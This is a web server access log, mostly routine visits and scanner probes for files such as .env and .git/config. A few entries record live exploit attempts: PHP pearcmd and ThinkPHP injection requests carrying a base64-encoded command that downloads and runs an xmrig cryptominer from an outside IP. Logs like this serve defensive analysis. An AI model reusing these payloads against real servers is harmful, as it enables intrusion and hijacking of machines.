193.35.18.31 - - [01/Oct/2023:07:21:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 494 "http://172.105.179.156:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
172.68.66.159 - - [01/Oct/2023:11:19:20 +0000] "GET /about HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.69.62.35 - - [01/Oct/2023:11:19:20 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.69.62.46 - - [01/Oct/2023:11:19:21 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.143 - - [01/Oct/2023:11:19:21 +0000] "GET /about HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
108.162.250.188 - - [01/Oct/2023:11:19:21 +0000] "GET /v2/_catalog HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.69.62.65 - - [01/Oct/2023:11:19:22 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.143 - - [01/Oct/2023:11:19:22 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 490 "-" "Go-http-client/1.1"
172.69.62.88 - - [01/Oct/2023:11:19:22 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
108.162.250.144 - - [01/Oct/2023:11:19:23 +0000] "GET /v2/_catalog HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.160 - - [01/Oct/2023:11:19:23 +0000] "GET /server-status HTTP/1.1" 403 494 "-" "Go-http-client/1.1"
172.68.66.124 - - [01/Oct/2023:11:19:24 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.146.80 - - [01/Oct/2023:11:19:24 +0000] "GET /login.action HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.158 - - [01/Oct/2023:11:19:25 +0000] "GET /_all_dbs HTTP/1.1" 404 491 "-" "Mozilla/5.0 (l9scan/2.0.6343e2435313e27363e2237313; +https://leakix.net)"
172.68.66.39 - - [01/Oct/2023:11:19:25 +0000] "GET /server-status HTTP/1.1" 403 494 "-" "Go-http-client/1.1"
172.69.62.14 - - [01/Oct/2023:11:19:26 +0000] "GET /.DS_Store HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.146.64 - - [01/Oct/2023:11:19:26 +0000] "GET /login.action HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.6 - - [01/Oct/2023:11:19:27 +0000] "GET /.env HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.6 - - [01/Oct/2023:11:19:27 +0000] "GET /_all_dbs HTTP/1.1" 404 490 "-" "Mozilla/5.0 (l9scan/2.0.439313e243e21323e2430313; +https://leakix.net)"
172.68.210.4 - - [01/Oct/2023:11:19:28 +0000] "GET /.git/config HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.69.62.56 - - [01/Oct/2023:11:19:28 +0000] "GET /.DS_Store HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
108.162.250.155 - - [01/Oct/2023:11:19:29 +0000] "GET /s/6343e2435313e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.39 - - [01/Oct/2023:11:19:29 +0000] "GET /.env HTTP/1.1" 404 490 "-" "Go-http-client/1.1"
172.68.146.39 - - [01/Oct/2023:11:19:29 +0000] "GET /config.json HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.210.53 - - [01/Oct/2023:11:19:30 +0000] "GET /.git/config HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
108.162.250.27 - - [01/Oct/2023:11:19:30 +0000] "GET /telescope/requests HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.66.158 - - [01/Oct/2023:11:19:31 +0000] "GET /s/439313e243e21323e2430313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.210.76 - - [01/Oct/2023:11:19:31 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 3460 "-" "Go-http-client/1.1"
172.68.146.65 - - [01/Oct/2023:11:19:32 +0000] "GET /config.json HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
108.162.249.4 - - [01/Oct/2023:11:19:33 +0000] "GET /telescope/requests HTTP/1.1" 404 491 "-" "Go-http-client/1.1"
172.68.210.53 - - [01/Oct/2023:11:19:34 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 3459 "-" "Go-http-client/1.1"
172.69.62.57 - - [01/Oct/2023:11:21:19 +0000] "GET / HTTP/1.1" 200 3460 "https://mindoor.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1;"
172.69.62.35 - - [01/Oct/2023:11:21:19 +0000] "GET / HTTP/1.1" 200 3460 "https://mindoor.live/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42"
172.69.62.71 - - [01/Oct/2023:11:21:19 +0000] "GET / HTTP/1.1" 200 3460 "https://mindoor.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
172.69.62.9 - - [01/Oct/2023:11:21:19 +0000] "GET / HTTP/1.1" 200 3460 "https://mindoor.live/" "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
172.69.62.36 - - [01/Oct/2023:11:21:19 +0000] "GET / HTTP/1.1" 200 3460 "https://mindoor.live/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
172.69.62.37 - - [01/Oct/2023:11:24:17 +0000] "GET / HTTP/1.1" 200 3460 "http://mindoor.live/" "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
172.69.62.77 - - [01/Oct/2023:11:24:17 +0000] "GET / HTTP/1.1" 200 3460 "http://mindoor.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1"
172.69.62.56 - - [01/Oct/2023:11:24:17 +0000] "GET / HTTP/1.1" 200 3460 "http://mindoor.live/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42"
172.69.62.37 - - [01/Oct/2023:11:24:17 +0000] "GET / HTTP/1.1" 200 3459 "http://mindoor.live/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
172.69.62.82 - - [01/Oct/2023:11:24:17 +0000] "GET / HTTP/1.1" 200 3460 "http://mindoor.live/" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/113.0 Firefox/113.0"
172.68.146.69 - - [01/Oct/2023:11:24:18 +0000] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3608 "http://mindoor.live/" "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
172.69.62.70 - - [01/Oct/2023:11:33:56 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.88 Safari/537.36"
143.110.222.166 - - [01/Oct/2023:11:34:35 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.69.62.56 - - [01/Oct/2023:11:36:33 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0"
172.68.210.46 - - [01/Oct/2023:11:36:34 +0000] "GET /manual HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0"
172.69.62.77 - - [01/Oct/2023:11:37:54 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.69.62.42 - - [01/Oct/2023:11:37:58 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36"
148.153.84.149 - - [01/Oct/2023:11:41:26 +0000] "GET / HTTP/1.1" 200 1459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
172.69.62.65 - - [01/Oct/2023:11:41:54 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13"
172.68.210.66 - - [01/Oct/2023:11:41:55 +0000] "GET /manual HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13"
172.69.62.26 - - [01/Oct/2023:11:48:29 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (scanner.ducks.party)"
18.203.98.199 - - [01/Oct/2023:11:48:30 +0000] "GET /robots.txt HTTP/1.1" 404 456 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
172.68.146.39 - - [01/Oct/2023:11:48:30 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (scanner.ducks.party)"
18.203.98.199 - - [01/Oct/2023:11:48:30 +0000] "GET / HTTP/1.1" 200 3423 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
192.241.224.28 - - [01/Oct/2023:11:48:52 +0000] "GET /portal/redlion HTTP/1.1" 200 752 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [01/Oct/2023:11:50:10 +0000] "\x16\x03\x01" 400 477 "-" "-"
216.219.94.144 - - [01/Oct/2023:11:51:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 200 808 "http://172.105.179.156:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
172.69.62.56 - - [01/Oct/2023:11:56:47 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
172.68.146.38 - - [01/Oct/2023:11:56:48 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "https://mindoor.live/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
172.69.62.57 - - [01/Oct/2023:11:57:14 +0000] "GET / HTTP/1.1" 304 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:17 +0000] "GET / HTTP/1.1" 200 976 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:18 +0000] "GET /static/style1.css HTTP/1.1" 200 1202 "http://172.105.179.156/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:18 +0000] "GET /favicon.ico HTTP/1.1" 200 807 "http://172.105.179.156/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:18 +0000] "GET /static/custom.css.map HTTP/1.1" 404 494 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:44 +0000] "GET / HTTP/1.1" 200 976 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
101.189.105.250 - - [01/Oct/2023:11:57:44 +0000] "GET /favicon.ico HTTP/1.1" 200 807 "http://172.105.179.156/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
163.123.142.245 - - [01/Oct/2023:12:16:11 +0000] "GET / HTTP/1.1" 200 939 "-" "Linux Gnu (cow)"
89.32.41.155 - - [01/Oct/2023:12:27:32 +0000] "GET /index.php?s=/index/ hink" 400 477 "-" "-"
143.110.222.166 - - [01/Oct/2023:12:36:51 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.69.62.43 - - [01/Oct/2023:12:50:58 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19"
172.68.210.64 - - [01/Oct/2023:12:50:59 +0000] "GET /manual HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19"
64.62.197.237 - - [01/Oct/2023:12:58:54 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
64.62.197.233 - - [01/Oct/2023:13:00:16 +0000] "GET /favicon.ico HTTP/1.1" 200 752 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.240 - - [01/Oct/2023:13:00:49 +0000] "GET /geoserver/web/ HTTP/1.1" 200 752 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
172.69.62.77 - - [01/Oct/2023:13:01:22 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
172.68.146.38 - - [01/Oct/2023:13:01:22 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "https://mindoor.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
172.69.62.56 - - [01/Oct/2023:13:04:04 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
172.69.62.65 - - [01/Oct/2023:13:09:50 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edge/96.0.1054.34"
172.69.62.71 - - [01/Oct/2023:13:21:59 +0000] "GET / HTTP/1.1" 304 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
172.69.62.70 - - [01/Oct/2023:13:23:04 +0000] "GET / HTTP/1.1" 304 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
143.110.222.166 - - [01/Oct/2023:13:35:38 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.69.62.70 - - [01/Oct/2023:13:40:55 +0000] "GET / HTTP/1.1" 304 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43"
172.104.11.51 - - [01/Oct/2023:13:49:01 +0000] "\x16\x03\x01" 400 477 "-" "-"
172.104.210.50 - - [01/Oct/2023:14:13:14 +0000] "GET / HTTP/1.1" 200 939 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [01/Oct/2023:14:31:58 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.69.62.8 - - [01/Oct/2023:14:45:42 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-us) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/30.0.1599.114 Safari/537.36 Puffin/4.8.0.2965AT"
193.35.18.187 - - [01/Oct/2023:14:57:32 +0000] "CONNECT google.com:443 HTTP/1.1" 405 501 "-" "Go-http-client/1.1"
162.243.143.52 - - [01/Oct/2023:15:07:07 +0000] "GET /manager/text/list HTTP/1.1" 200 752 "-" "Mozilla/5.0 zgrab/0.x"
165.154.119.158 - - [01/Oct/2023:15:23:08 +0000] "\x16\x03\x01\x01\t\x01" 400 477 "-" "-"
165.154.119.158 - - [01/Oct/2023:15:23:21 +0000] "GET / HTTP/1.1" 200 1440 "-" "-"
165.154.119.158 - - [01/Oct/2023:15:23:27 +0000] "GET /favicon.ico HTTP/1.1" 200 752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.119.158 - - [01/Oct/2023:15:23:29 +0000] "GET /robots.txt HTTP/1.1" 200 752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.119.158 - - [01/Oct/2023:15:23:31 +0000] "GET /sitemap.xml HTTP/1.1" 200 752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
143.110.222.166 - - [01/Oct/2023:15:34:59 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.248.229.49 - - [01/Oct/2023:15:45:13 +0000] "GET /aaa9 HTTP/1.1" 200 752 "-" "Mozilla/5.0 zgrab/0.x"
104.248.229.49 - - [01/Oct/2023:15:45:15 +0000] "GET /aab8 HTTP/1.1" 200 752 "-" "Mozilla/5.0 zgrab/0.x"
104.248.229.49 - - [01/Oct/2023:15:45:19 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [01/Oct/2023:15:48:32 +0000] "\x16\x03\x01" 400 477 "-" "-"
45.95.147.236 - - [01/Oct/2023:15:49:37 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode(\"bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ==\"));?>+/tmp/ohhellohttpserver.php HTTP/1.1" 200 1080 "-" "Custom-HttpClient"
45.95.147.236 - - [01/Oct/2023:15:49:37 +0000] "GET /index.php?lang=../../../../../../../../tmp/ohhellohttpserver HTTP/1.1" 200 1079 "-" "Custom-HttpClient"
45.95.147.236 - - [01/Oct/2023:15:49:37 +0000] "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo${IFS}bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ==|base64${IFS}-d|sh HTTP/1.1" 200 1079 "-" "Custom-HttpClient"
45.95.147.236 - - [01/Oct/2023:15:49:40 +0000] "GET /index.php?s=/index/ hink" 400 477 "-" "-"
45.95.147.236 - - [01/Oct/2023:15:49:47 +0000] "GET /public/index.php?s=/index/ hink" 400 477 "-" "-"
143.110.222.166 - - [01/Oct/2023:16:34:45 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.210.31.175 - - [01/Oct/2023:16:37:51 +0000] "GET / HTTP/1.1" 200 10926 "-" "-"
74.249.245.33 - - [01/Oct/2023:17:03:38 +0000] "GET / HTTP/1.1" 200 3404 "-" "Go-http-client/1.1"
74.249.245.33 - - [01/Oct/2023:17:03:38 +0000] "GET /contract.php HTTP/1.1" 404 441 "-" "Go-http-client/1.1"
74.249.245.33 - - [01/Oct/2023:17:03:38 +0000] "GET /about.php HTTP/1.1" 404 441 "-" "Go-http-client/1.1"
143.110.222.166 - - [01/Oct/2023:17:37:18 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
107.170.246.29 - - [01/Oct/2023:17:38:39 +0000] "GET /manager/text/list HTTP/1.1" 200 752 "-" "Mozilla/5.0 zgrab/0.x"
109.237.98.226 - - [01/Oct/2023:17:46:30 +0000] "GET /.env HTTP/1.1" 200 808 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [01/Oct/2023:17:46:31 +0000] "\x16\x03\x01\x01H\x01" 400 477 "-" "-"
172.104.11.51 - - [01/Oct/2023:17:48:33 +0000] "\x16\x03\x01" 400 477 "-" "-"
185.36.81.33 - - [01/Oct/2023:18:10:01 +0000] "GET / HTTP/1.1" 200 976 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.69.62.71 - - [01/Oct/2023:18:27:25 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
172.68.146.39 - - [01/Oct/2023:18:27:27 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
143.110.222.166 - - [01/Oct/2023:18:37:23 +0000] "GET / HTTP/1.1" 200 920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
34.116.99.84 - - [01/Oct/2023:18:59:10 +0000] "\x16\x03\x01" 400 477 "-" "-"
34.116.99.84 - - [01/Oct/2023:18:59:12 +0000] "OPTIONS / HTTP/1.0" 200 199 "-" "-"
94.25.170.202 - - [01/Oct/2023:19:02:22 +0000] "GET /contact/ HTTP/1.0" 404 456 "http://vimpact.com.au/contact/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"
94.25.170.202 - - [01/Oct/2023:19:02:23 +0000] "GET / HTTP/1.0" 200 10945 "http://vimpact.com.au/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"
198.199.107.105 - - [01/Oct/2023:19:09:10 +0000] "MGLNDD_172.105.179.156_80\n" 400 477 "-" "-"
172.69.62.38 - - [01/Oct/2023:19:18:14 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
172.69.62.27 - - [01/Oct/2023:19:19:19 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0"
172.69.62.83 - - [01/Oct/2023:19:19:31 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.2.3) Gecko/20100401 Lightningquail/3.6.3"
